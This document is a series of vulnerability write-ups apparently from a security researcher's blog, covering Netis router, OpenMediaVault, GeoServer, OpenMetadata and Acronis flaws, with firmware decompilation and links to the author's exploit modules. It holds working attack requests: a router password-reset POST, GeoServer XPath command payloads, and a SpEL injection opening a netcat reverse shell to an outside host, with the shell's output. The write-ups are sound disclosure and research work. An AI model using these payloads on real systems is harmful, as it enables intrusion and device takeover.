wlanMode=0&wl_idx=0&ssid2g=bmV0aXMtMDAwMDAw&encrypt=4&wpaPsk=SWwwdmVoYWNraW5n&wpaPskType=2&wpaPskFormat=0&password=SWwwdmVoYWNraW5n&autoUpdate=0&firstSetup=1&quick_set=ap&app=wan_set_shortcut&wl_link=0
```
**Successful Response**
```html
HTTP/1.1 200 OK
Date: Sun, 02 Jun 2024 12:20:24 GMT
Server: Boa/0.94.14rc21
Connection: close

["SUCCESS"]
```
You can even modify the request to only manipulate the router administration password by stripping the wifi parameters  from the request.
```html
POST /cgi-bin/skk_set.cgi HTTP/1.1
Host: 192.168.1.1
Content-Length: 59
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.1
Referer: http://192.168.1.1/guide/welcome.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

password=SWwwdmVoYWNraW5n&quick_set=ap&app=wan_set_shortcut
```
So far, so good, but besides this authentication bypass, there is also a blind command injection vulnerability in the password parameter according to CVE description.

To understand this a bit better, we need to dig into the firmware code.
If you login in into the emulated router software, you will find the main web binary `netis.cgi` in `/bin`. This is a compiled MIPS ELF binary so we need a tool like `ghidra` to decompile and understand the code.

Loading and analyzing `netis.cgi` in `ghidra` shows that the main program is a wrapper that runs the specific `cgi` request calls like our `skk_set.cgi` that we can see with `burpsuite` when interacting with the Netis web interface.
```C
undefined4 main(undefined4 param_1,char **param_2)

{
  bool bVar1;
  size_t sVar2;
  int iVar3;
  char *pcVar4;
  char *local_188;
  int local_184;
  int local_17c;
  void *local_160;
  char acStack_15c [256];
  char cStack_5c;
  char acStack_5b [63];
  int local_1c;
  char *local_18 [4];
  
  local_160 = (void *)0x0;
  memset(&cStack_5c,0,0x40);
  local_1c = 0;
  sVar2 = strlen(*param_2);
  while (local_1c < (int)sVar2) {
    memset(&cStack_5c,0,0x40);
    iVar3 = local_1c;
    FUN_0040670c((int)*param_2,'/',&local_1c);
    strncpy(&cStack_5c,*param_2 + iVar3,local_1c - iVar3);
    do {
      local_1c = local_1c + 1;
    } while ((*param_2)[local_1c] == '/');
  }
  local_188 = &cStack_5c;
  bVar1 = false;
  local_18[0] = "skk_set.cgi";
  local_18[1] = "upload_config.cgi";
  local_18[2] = "upload_fw.cgi";
  local_18[3] = (char *)0x0;
  local_17c = 0;
  do {
    if (local_18[local_17c] == (char *)0x0) {
LAB_00405408:
      if (bVar1) {
        iVar3 = open("/tmp/lock_all.lock",0x702,0x1b4);
        if (iVar3 < 0) {
          local_184 = FUN_004050fc();
          if (local_184 < 0) {
            local_184 = 0;
          }
          FUN_00405060(local_184);
          if (2 < local_184) {
            system("rm -rf /tmp/lock_all.lock");
            FUN_00405060(0);
          }
          printf("[\"LOCK\"]");
          return 0;
        }
        close(iVar3);
      }
      apmib_init();
      FUN_00422c38(&local_160,param_2[1]);
      DAT_00440d40 = FUN_00405190();
      if (local_188 == (char *)0x0) {
        iVar3 = access("/tmp/lock_all.lock",0);
        if (iVar3 == 0) {
          system("rm -rf /tmp/lock_all.lock");
        }
        FUN_004214cc(&local_160);
        printf("[\"%d\"]",999);
      }
      else {
        pcVar4 = strstr(local_188,".cgi");
        if (pcVar4 != (char *)0x0) {
          pcVar4 = strchr(local_188,0x2f);
          if (pcVar4 != (char *)0x0) {
            local_188 = acStack_5b;
          }
          FUN_00405764(local_188,&local_160,acStack_15c);
        }
        fflush(stdout);
        FUN_004214cc(&local_160);
        iVar3 = access("/tmp/lock_all.lock",0);
        if (iVar3 == 0) {
          system("rm -rf /tmp/lock_all.lock");
        }
        FUN_00405060(0);
      }
      return 0;
    }
    iVar3 = strcmp(local_188,local_18[local_17c]);
    if (iVar3 == 0) {
      bVar1 = true;
      goto LAB_00405408;
    }
    local_17c = local_17c + 1;
  } while( true );
}
```
Let's check the code for the `password` string and see where is it used. You can do this by using the search function in `ghidra`.
This creates quite some hits, but the most interesting hit is the `ex_password` variable which seems to be linked to a script `/bin/script/password.sh`
```C
                             ex_password                                     XREF[2]:     Entry Point(*), 
                                                                                          FUN_0041301c:00413180(*)  
        0043be44 2f 62 69        ds         "/bin/script/password.sh"
                 6e 2f 73 
                 63 72 69 
```
Checking out function `FUN_0041301c:00413180(*) ` shows `ex_password` a.k.a. `/bin/script/password,sh` is being called by the function `FUN_00402e00("%s > /dev/console",ex_password,pcVar1,param_4);`.

```C
undefined4 FUN_0041301c(undefined4 *param_1,undefined4 param_2,char *param_3,undefined4 param_4)

{
  char *pcVar1;
  byte *pbVar2;
  byte abStack_8c [132];
  
  pcVar1 = FUN_00405644(param_1,"usb3gEnabled");
  if (pcVar1 != (char *)0x0) {
    FUN_00405644(param_1,"usb3gPinCode");
    param_3 = FUN_00405644(param_1,"usb3gApn");
    param_4 = 0;
    FUN_00412fe4();
    FUN_00402e00("%s > /dev/console",ex_usbcontrol,param_3,param_4);
  }
  pbVar2 = (byte *)FUN_00405644(param_1,"ssid2g");
  if (pbVar2 != (byte *)0x0) {
    FUN_004030f4(abStack_8c,pbVar2);
    strcpy((char *)(pMib + 0x42c1),(char *)abStack_8c);
  }
  FUN_00402e00("echo 0 > %s","/proc/http_redirect/enable",param_3,param_4);
  memset(abStack_8c,0,0x80);
  apmib_get(0x159,abStack_8c);
  pcVar1 = "/proc/rtl_dnstrap/domain_name";
  FUN_00402e00("echo \'%s\' > %s",abStack_8c,"/proc/rtl_dnstrap/domain_name",param_4);
  FUN_00402e00("%s > /dev/console",ex_password,pcVar1,param_4);
  FUN_00402e00("%s > /dev/console",param_2,pcVar1,param_4);
  return 0;
}
```
Interesting, but lets check if this code segment really gets executed if we run the POST request again. A quick trick is to monitor the process list on the router and grep the relevant processes during the execution of the POST request.
```shell
# while true; do ps|grep -e password.sh -e rtl -e http_redirect|grep -v grep;done
 3518 root      1132 R    /bin/sh -c echo 0 > /proc/http_redirect/enable
 3520 root      1132 R    /bin/sh -c echo 'netis.cc' > /proc/rtl_dnstrap/domain
 3531 root      1140 S    /bin/sh -c /bin/script/password.sh > /dev/console
 3538 root       324 R    /bin/script/password.sh
 3531 root      1140 S    /bin/sh -c /bin/script/password.sh > /dev/console
 3538 root      1656 S    /bin/script/password.sh
```
And indeed `/bin/script/password.sh` gets executed as well as some other commands listed in the code.

So let's now focus on the `/bin/scripts/password.sh`. 
Checking out this shell script, it turns out to be a compiled MIPS ELF binary instead of a text readable unix shell script. 

Let's use `ghidra` again to decompile this binary and use the search function to look for the `password` string.
Again quite some hits, but then I stumble over a very interesting piece of code.
```C
                             s_Changed_Username_and_Password_.._0041dc80     XREF[1]:     FUN_00409590:0040969c(*)  
        0041dc80 43 68 61        ds         "Changed Username and Password ...........\n"
                 6e 67 65 
                 64 20 55 
```
This is most likely the code section that sets the router administration password.

Checking out the function `FUN_00409590` is revealing two major issues.
```C
void FUN_00409590(void)

{
  undefined auStack_488 [64];
  undefined auStack_448 [64];
  undefined auStack_408 [1024];
  
  memset(auStack_408,0,0x400);
  memset(auStack_488,0,0x40);
  memset(auStack_448,0,0x40);
  apmib_get(0x15d,auStack_488);
  apmib_get(0x15e,auStack_448);
  RunSystemCmd("echo \"root::0:0:root:/:/bin/sh\" > /var/passwd");
  RunSystemCmd("echo \"nobody:x:0:0:nobody:/:/dev/null\" >> /var/passwd");
  RunSystemCmd("echo root:%s | chpasswd -m",auStack_448);
  RunSystemCmd("echo \"root:x:0:root\" > /var/group");
  RunSystemCmd("echo \"nobody:x:0:nobody\" >> /var/group");
  RunSystemCmd("chmod 755 /var/passwd");
  RunSystemCmd("chmod 755 /var/group");
  fwrite("Changed Username and Password ...........\n",1,0x2a,stderr);
  return;
}
```
The first issue is that the router administration password is directly linked to the root password of router itself. 
Oeps! That is not really best practice and attackers love these things.

The second issue is the blind command injection where the vulnerable code `RunSystemCmd("echo root:%s | chpasswd -m",auStack_448);` allows an attacker to manipulate password argument represented by `auStack_448` and inject and execute code using the unix backtics.
This explains why the password parameter is indeed vulnerable of blind command injection.

The `RunSystemCmd` function is just a piece a code which is defined in the library `libapmib.so` and executes a unix command line using the `system()` call.
```C
void RunSystemCmd(char *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 local_res4;
  undefined4 local_res8;
  undefined4 local_resc;
  char acStack_118 [256];
  undefined4 *local_18;
  
  local_res4 = param_2;
  local_res8 = param_3;
  local_resc = param_4;
  memset(acStack_118,0,0x100);
  local_18 = &local_res4;
  vsprintf(acStack_118,param_1,local_18);
  system(acStack_118);
  return;
}
```
I have created an exploit that is published as official module [Netis MW5360 unauthenticated RCE [CVE-2024-22729]](https://github.com/rapid7/metasploit-framework/pull/19188) in Metasploit.
Unfortunately there is no mitigation, because the latest firmware from April 2024 is still vulnerable. So be on the alert when suddenly your router administration password changes unexpectedly and you can not login into your router anymore.

## References
[CVE-2024-22729](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22729)
[Netis MW5360 unauthenticated RCE [CVE-2024-22729]](https://github.com/rapid7/metasploit-framework/pull/19188)
[Firmware MW5360-1.0.1.3442](https://www.netisru.com/Suppory/de_details/id/1/de/136.html)

### Credits
Credits go to the security researcher below who discovered this vulnerability.
* `adhikara13`



---

## CVE-2013-3632
*Posted 2024-07-02 · last revised 2024-07-22*

> The Cron service in rpc.php in OpenMediaVault allows remote authenticated users to execute cron jobs as arbitrary users and execute arbitrary commands via the username parameter.

This is a golden oldie, that never has been fixed. The existing module in Metasploit , `exploit/multi/http/openmediavault_cmd_exec` works only on versions in the range `0.4.x`
Unfortunately the vulnerability still exists within all OpenMediaVault versions starting from from `0.5` until the recent release `7.4.2-2` and it allows an authenticated user to create and run cron jobs as root on the system.
I have created a new [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/19298) that can handle all targets from versions `0.1` and above. Shodan shows more then 10000 vulnerable instances and hundreds of them still have the default `admin:openmediavault` credentials configured which allows an attacker to leverage this exploit.

This module has been  successfully tested on:

**OpenMediaVault x64 appliances:**
* openmediavault_0.2_amd64.iso
* openmediavault_0.2.5_amd64.iso
* openmediavault_0.3_amd64.iso
* openmediavault_0.4_amd64.iso
* openmediavault_0.4.32_amd64.iso
* openmediavault_0.5.0.24_amd64.iso
* openmediavault_0.5.48_amd64.iso
* openmediavault_1.9_amd64.iso
* openmediavault_2.0.13_amd64.iso
* openmediavault_2.1_amd64.iso
* openmediavault_3.0.2-amd64.iso
* openmediavault_3.0.26-amd64.iso
* openmediavault_3.0.74-amd64.iso
* openmediavault_4.0.9-amd64.iso
* openmediavault_4.1.3-amd64.iso
* openmediavault_5.0.5-amd64.iso
* openmediavault_5.5.11-amd64.iso
* openmediavault_5.6.13-amd64.iso
* openmediavault_6.0-16-amd64.iso
* openmediavault_6.0-34-amd64.iso
* openmediavault_6.0-amd64.iso
* openmediavault_6.0.24-amd64.iso
* openmediavault_6.5.0-amd64.iso
* openmediavault_7.0-20-amd64.iso
* openmediavault_7.0-32-amd64.iso

**ARM64 on Raspberry PI running Kali Linux 2024-3:**
* openmediavault 7.3.0-5
* openmediavault 7.4.2-2

**VirtualBox Images (x64):**
* openmediavault 0.4.24
* openmediavault 0.5.30
* openmediavault 1.0.21

You can download the iso images from [here](https://sourceforge.net/projects/openmediavault/files/iso/).

### Mitigation
There is no fix available to address this vulnerability. This weakness has been there since 2013 and never fixed. Future releases will probably not fix it. Contacted the lead developer, but did not get any response. The only precaution that you can take is to ensure that you change the default admin credentials. It is not forced, so you need to take the action yourself.

### References
[CVE-2013-3632](https://nvd.nist.gov/vuln/detail/CVE-2013-3632)
[Packetstorm Public Exploit](https://packetstormsecurity.com/files/178526)
[Metasploit Module - OpenMediaVault authenticated RCE](https://github.com/rapid7/metasploit-framework/pull/19298)
[OpenMediaVault ISO Downloads](https://sourceforge.net/projects/openmediavault/files/iso/)

---

## CVE-2024-36401
*Posted 2024-07-10 · last revised 2024-10-14*

> GeoServer is an open source server that allows users to share and edit geospatial data. Prior to versions 2.22.6, 2.23.6, 2.24.4, and 2.25.2, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.  The GeoTools library API that GeoServer calls evaluates property/attribute names for feature types in a way that unsafely passes them to the commons-jxpath library which can execute arbitrary code when evaluating XPath expressions. This XPath evaluation is intended to be used only by complex feature types (i.e., Application Schema data stores) but is incorrectly being applied to simple feature types as well which makes this vulnerability apply to **ALL** GeoServer instances. No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests. This vulnerability can lead to executing arbitrary code.  Versions 2.22.6, 2.23.6, 2.24.4, and 2.25.2 contain a patch for the issue. A workaround exists by removing the `gt-complex-x.y.jar` file from the GeoServer where `x.y` is the GeoTools version (e.g., `gt-complex-31.1.jar` if running GeoServer 2.25.1). This will remove the vulnerable code from GeoServer but may break some GeoServer functionality or prevent GeoServer from deploying if the gt-complex module is needed.

GeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.

In the GeoServer version prior to `2.25.1`, `2.24.3 ` and `2.23.5` of GeoServer, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as `XPath` expressions. It is confirmed that is exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.

Examples of an evil `XPath` request.

**GET method request using the WFS GetPropertyValue**
```html
GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/pawned') HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
```
**POST method request using the WFS GetPropertyValue**
```html
POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/pawned')</wfs:valueReference>
</wfs:GetPropertyValue>
```
When successful, the response will return  a `java.lang.ClassCastException` error and  file `tmp/pawned` will be created.

It is important that the typeNames  or feature types like `sf:archsites` exists in the GeoServer configuration. Also some typeNames/feature types do not work. You can find a working list of default typeNames / feature types below.
```
allowed_feature_types = ['sf:archsites', 'sf:bugsites', 'sf:restricted', 'sf:roads', 'sf:streams', 'ne:boundary_lines', 'ne:coastlines', 'ne:countries', 'ne:disputed_areas', 'ne:populated_places']
```

There are multipe method request using different `XPath expressions`. You can find a full set of examples [here](https://xz.aliyun.com/t/14991?time__1311=GqAh0IqGxmxfx0v44%2BxCqT1YGC7jqNI3x).
It is Chinese, but Google translate can help you out here ;-)

I have created a [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/19311) that exploits this vulnerability. It works both on Linux and Windows (credits go to jheysel-r7 to make windows work!)

### Mitigation
Versions `2.23.6`, `2.24.4`, and `2.25.2` contain a patch for the issue. 

### References
[CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)
[Metasploit Module - GeoServer unauthenticated RCE](https://github.com/rapid7/metasploit-framework/pull/19311)
[POC examples in Chinese](https://xz.aliyun.com/t/14991?time__1311=GqAh0IqGxmxfx0v44%2BxCqT1YGC7jqNI3x)
[GeoServer Advisory: GHSA-6jj6-gm7p-fcvv](https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv)

---

## CVE-2024-28255
*Posted 2024-07-28 · last revised 2024-08-08*

> OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. The `JwtFilter` handles the API authentication by requiring and verifying JWT tokens. When a new request comes in, the request's path is checked against this list. When the request's path contains any of the excluded endpoints the filter returns without validating the JWT. Unfortunately, an attacker may use Path Parameters to make any path contain any arbitrary strings. For example, a request to `GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/111` will match the excluded endpoint condition and therefore will be processed with no JWT validation allowing an attacker to bypass the authentication mechanism and reach any arbitrary endpoint, including the ones listed above that lead to arbitrary SpEL expression injection. This bypass will not work when the endpoint uses the `SecurityContext.getUserPrincipal()` since it will return `null` and will throw an NPE. This issue may lead to authentication bypass and has been addressed in version 1.2.4. Users are advised to upgrade. There are no known workarounds for this vulnerability. This issue is also tracked as `GHSL-2023-237`.

Interesting case that allows for unauthenticated access to JWT token protected API calls in OpenMetada version `1.2.3` and below.
Reading the vulnerability description, it has to do with a incomplete `Jwtfilter` that allows to bypass this JWT token authentication.

I have pulled these  specific code changes between OpenMetadata version `1.2.3` and `1.2.4`.
It is obvious that implementation of the `Jwtfilter` is not strict using `uriInfo.getPath().contains(endpoint)` in version `1.2.3`, whilst in version `1.2.4` it has been fixed and restricted using `uriInfo.getPath().equalsIgnoreCase(endpoint)`

**OpenMetadata 1.2.3 excerpt from JwtFilter.java**
```java
public static final List<String> EXCLUDED_ENDPOINTS =
      List.of(
          "v1/system/config",
          "v1/users/signup",
          "v1/system/version",
          "v1/users/registrationConfirmation",
          "v1/users/resendRegistrationToken",
          "v1/users/generatePasswordResetLink",
          "v1/users/password/reset",
          "v1/users/checkEmailInUse",
          "v1/users/login",
          "v1/users/refresh");

  public void filter(ContainerRequestContext requestContext) {
    UriInfo uriInfo = requestContext.getUriInfo();
    if (EXCLUDED_ENDPOINTS.stream().anyMatch(endpoint -> uriInfo.getPath().contains(endpoint))) {
      return;
    }
```
**OpenMetadata 1.2.4 excerpt from JwtFilter.java**
```java
public static final List<String> EXCLUDED_ENDPOINTS =
      List.of(
          "v1/system/config/jwks",
          "v1/system/config/authorizer",
          "v1/system/config/customLogoConfiguration",
          "v1/system/config/auth",
          "v1/users/signup",
          "v1/system/version",
          "v1/users/registrationConfirmation",
          "v1/users/resendRegistrationToken",
          "v1/users/generatePasswordResetLink",
          "v1/users/password/reset",
          "v1/users/checkEmailInUse",
          "v1/users/login",
          "v1/users/refresh");

  public void filter(ContainerRequestContext requestContext) {
    UriInfo uriInfo = requestContext.getUriInfo();
    if (EXCLUDED_ENDPOINTS.stream()
        .anyMatch(endpoint -> uriInfo.getPath().equalsIgnoreCase(endpoint))) {
      return;
    }
```
By adding an URL from the excluded list to a JWT token protected API url, you can potentially bypass the authentication and use the existing sPEL injection vulnerabilities in OpenMetadata version `1.2.3` and below:
[CVE-2024-28254](https://nvd.nist.gov/vuln/detail/CVE-2024-28254) -> `GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/<expression>`
[CVE-2024-28848](https://nvd.nist.gov/vuln/detail/CVE-2024-28848) -> `GET /api/v1;v1%2fusers%2flogin/policies/validation/condition/<expression>`

### Small demonstration ###
**Chaining CVE-2024-28255 and CVE-2024-28254 to get an unauthenticated RCE via sPEL injection**
sPEL injection: `T(java.lang.Runtime).getRuntime().exec('nc 192.168.201.8 4444 -e /bin/sh')`
Listener: `nc -lvnp 4444`
Also ensure that you URL encode the payload, otherwise your GET request might not deliver the expected response.
```shell
 # curl 'http://192.168.201.42:8585/api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27nc%20192.168.201.8%204444%20-e%20%2Fbin%2Fsh%27%29'
{"code":400,"message":"Failed to evaluate - EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.Boolean"}
```
RCE is succesfull if you receive a "Failed to evaluate - EL1001E" message.

```shell
# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.201.42 63333
pwd
/opt/openmetadata
id
uid=1000(openmetadata) gid=1000(openmetadata) groups=1000(openmetadata)
uname -a
Linux aec47ea48dc2 6.6.32-linuxkit #1 SMP PREEMPT_DYNAMIC Thu Jun 13 14:14:43 UTC 2024 x86_64 Linux
```
You can do the same by chaining [CVE-2024-28255](https://nvd.nist.gov/vuln/detail/CVE-2024-28255) and [CVE-2024-28848](https://nvd.nist.gov/vuln/detail/CVE-2024-28848).

By the way, most of the API enpoints are not susceptible to this bypass because most of these endpoint are using the `SecurityContext.getUserPrincipal()` that will return `null` using this JWT authentication bypass. You will get an error message as listed below.

**OpenMetadata API request to list all databases**
```http
GET /api/v1;v1%2fusers%2flogin/databases HTTP/1.1
Host: 192.168.201.42:8585
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: */*
Connection: keep-alive
```
**Response**
```http
HTTP/1.1 401 Unauthorized
Date: Wed, 31 Jul 2024 13:02:04 GMT
Content-Type: application/json
WWW-Authenticate: om-auth
Content-Length: 57
{ "code":401, "message":"No principal in security context" }
```
There is Metasploit module available that exploits this vulnerability in combination with the sPEL injection vulnerabilities.
You can find the module [here at PR 19347](https://github.com/rapid7/metasploit-framework/pull/19347).

### Mitigation ###
Upgrade to the latest release of OpenMetadata or at least upgrade to the patched version `1.2.4`.

### References ###
[CVE-2024-28255](https://nvd.nist.gov/vuln/detail/CVE-2024-28255)
[CVE-2024-28254](https://nvd.nist.gov/vuln/detail/CVE-2024-28254)
[CVE-2024-28848](https://nvd.nist.gov/vuln/detail/CVE-2024-28848)
[OpenMetadata Advisory GHSL-2023-235 - GHSL-2023-237](https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/)
[OpenMetadata Quickstart Docker deployment](https://docs.open-metadata.org/v1.3.x/quick-start/local-docker-deployment)
[sPEL injections](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spel-injection)
[HackTricks Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)
[Metasploit OpenMetadata authentication bypass and SpEL injection exploit chain](https://github.com/rapid7/metasploit-framework/pull/19347)

### Credits ###
 `Alvaro Munoz` alias `pwntester` (https://github.com/pwntester) - Discovery

---

## CVE-2023-45249
*Posted 2024-09-15 · last revised 2024-09-18*

> Remote command execution due to use of default passwords. The following products are affected: Acronis Cyber Infrastructure (ACI) before build 5.0.1-61, Acronis Cyber Infrastructure (ACI) before build 5.1.1-71, Acronis Cyber Infrastructure (ACI) before build 5.2.1-69, Acronis Cyber Infrastructure (ACI) before build 5.3.1-53, Acronis Cyber Infrastructure (ACI) before build 5.4.4-132.

On 24 July, Acronis published the security advisory [SEC-6452: Remote command execution due to use of default passwords](https://security-advisory.acronis.com/advisories/SEC-6452) where default passwords are exploited to gain admin access to the Acronis Cyber Infrastructure. It was also reported by Acronis that this vulnerability was actively exploited by cyber criminals and patched 9 months ago.

If you search for actual examples of the exploit, no detailed technical publications are available, so I thought let’s give it a go and figure out what this vulnerability is all about.

So I downloaded a Acronis Cyber Infrastructure (ACI) appliance `4.7` from their website and installed it on VirtualBox (see this [article](https://care.acronis.com/s/article/63431-Acronis-Cyber-Infrastructure-how-to-download-ISO?language=en_US)).
After completing the installation process, you access the Acronis Web Portal on port 8888 via HTTPS with the admin credentials set during the installation. You can also the access the appliance directly by logging in as root. These credentials are also asked and set during the installation process. This is of course very helpful to analyze the server image because you have full access to appliance and the installed software.

So lets start the search for our default passwords!!!

Let’s check first the user credentials available on the appliance itself by checking the `/etc/password` and `/etc/shadow` files.
Not much to gain here. The only password hash available in the `/etc/shadow` file is for user `root` which is set during the initial setup of the ACI appliance.

Next in line is to investigate the user credentials available in the Acronis Web Portal.
If you login as admin, you will find in the `settings->user and projects` section, three default users:
- admin
- backup-service-user 
- vstorage-service-user 

User admin credentials are set during  the installation process so that rules out the default password.
Both the backup-service-user and storage-service-user are potential candidates where the storage-service-user is the most promising candidate because this user is default enabled and has the role system-administrator assigned.

The appliance has a PostgreSQL DB that stores all configuration information. The users, passwords and roles are stored in the `keystone` database.

You can easily query the database by  logging into the appliance as root and switch  to the `postgres` user and access the database with `psql`.
```shell
Acronis Cyber Infrastructure release 4.7
========================================================================
= Warning! Do not enable third-party repositories. Install third-party =
= software only from the default repository. Use only commands allowed =
= in the product documentation.                                        =
========================================================================
[root@aci-471-53 ~]# su postgres
bash-4.2$ psql
could not change directory to "/root": Permission denied
psql (11.16)
Type "help" for help.

postgres=# \l
                                   List of databases
    Name    |   Owner    | Encoding |   Collate   |    Ctype    |   Access privileges
------------+------------+----------+-------------+-------------+-----------------------
 coredns    | coredns    | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 grafana    | grafana    | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 keystone   | vstoradmin | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres   | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0  | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |            |          |             |             | postgres=CTc/postgres
 template1  | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |            |          |             |             | postgres=CTc/postgres
 vstoradmin | vstoradmin | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
(7 rows)

postgres=# \c keystone
You are now connected to database "keystone" as user "postgres".
keystone=# select * from "local_user";
 id |             user_id              | domain_id |         name          | failed_auth_count | failed_auth_at
----+----------------------------------+-----------+-----------------------+-------------------+----------------
  1 | a56cc7f698fa41d99d1c9dd22aa73580 | default   | vstorage-service-user |                 0 |
  2 | 57bf107a224145c6a1217c71da5f4911 | default   | backup-service-user   |                   |
  3 | fad1606d29a64ff6b7c45b1128551a97 | default   | admin                 |                 0 |
(3 rows)

keystone=# select * from "password";
 id | local_user_id |         expires_at         | self_service |                        password_hash                         |  created_at_int  |  expires_at_int  |         created_at
----+---------------+----------------------------+--------------+--------------------------------------------------------------+------------------+------------------+----------------------------
  1 |             1 | 2024-08-05 11:31:58.573171 | f            | $2b$12$/.ZPGchRUlOGJcNO2S.bOOF3ykww0vShNEr/jwZxvQtksCzGHYcrO | 1653058897767616 | 1722857518573171 | 2022-05-20 15:01:37.767616
  2 |             1 |                            | f            | $2b$12$YKyODw1N3mTO9qj7ch1h6O2qZQGjSgW/CIKyQ2Tz7A49sJvHI0r/q | 1722857518573171 |                  | 2024-08-05 11:31:58.573171
  3 |             3 |                            | f            | $2b$12$3PT2/rbf4rkNBPThiZclyeD/FFP5UXLs4bTfg0L27LeSjqyxNQ2xO | 1722857529542615 |                  | 2024-08-05 11:32:09.542615
(3 rows)
```
We can query the users and the password hashes, which is promising but  “Are these default passwords?”, and if yes, “What is the password?”
To answers these questions, we need to dig a bit deeper within the appliance and figure out what happens during the initial installation and configuration setup of the appliance.
One very interesting directory is `/usr/libexec/vstorage-ui-backend/libexec` that holds most of initial configuration shell scripts called during the installation of the appliance.
```shell
[root@aci-471-53 libexec]# pwd
/usr/libexec/vstorage-ui-backend/libexec
[root@aci-471-53 libexec]# ls
alua-functions.sh      keystone-service-init.sh                                                     oneshot-0021-enable-russian-language.sh
bouncer-functions.sh   logging.sh                                                                   oneshot-cleanup-wal-archive.sh
check-backend.sh       oneshot-0008-upgrade-to-roles-sets.sh                                        oneshot-disable-wal-archiving.sh
clear-vips.sh          oneshot-0009-upgrade-db.sh                                                   oneshot-init-keystone.sh
db-functions.sh        oneshot-0010-disable-pghba-ident-entry.sh                                    oneshot-migrate-roles-to-agent.sh
dns-functions.sh       oneshot-0011-init-coredns.sh                                                 on-master.sh
functions.sh           oneshot-0012-enable-ha-for-postgresql.sh                                     on-standby.sh
gen-certificate.sh     oneshot-0013-clean-up-mdses-in-order-to-add-dns-srv-recs.sh                  pg-convert-layout.sh
ha-ovh-setup           oneshot-0014-create-self-service-roles-in-keystone.sh                        pg-scripts.sh
ha-ovh-teardown        oneshot-0015-clean-up-mdses-in-order-to-activate-vstorage-target-manager.sh  pg-switch-to-hot-standby.sh
ha-scripts.sh          oneshot-0016-update-internal-endpoint-in-keystone.sh                         pg-switch-to-master.sh
init-backend.sh        oneshot-0017-create-roles-implication-in-keystone.sh                         set-vips.sh
init-grafana.sh        oneshot-0018-create-backup-service-user.sh                                   takeover-management-node.sh
init-postinstall.sh    oneshot-0019-create-compute-cert.sh                                          utils-functions.sh
keystone-functions.sh  oneshot-0019-enable-postgres-backup.sh                                       uwsgi-backend-stop.sh
keystone-gen-env.sh    oneshot-0020-turn-off-aip-early-access.sh
[root@aci-471-53 libexec]#
```

I am not gonna dwell on all scripts, but the `oneshot-init-keystone.sh` is an interesting script to explore what is happening during initial installation.
```bash
#!/usr/bin/env bash

#set -x

. ~vstoradmin/libexec/logging.sh
LOG_FILE="/var/log/vstorage-ui-backend/init_keystone.log"
BACKEND_CONFIG=/usr/libexec/vstorage-ui-backend/etc/backend.cfg
log_init "${LOG_FILE}"
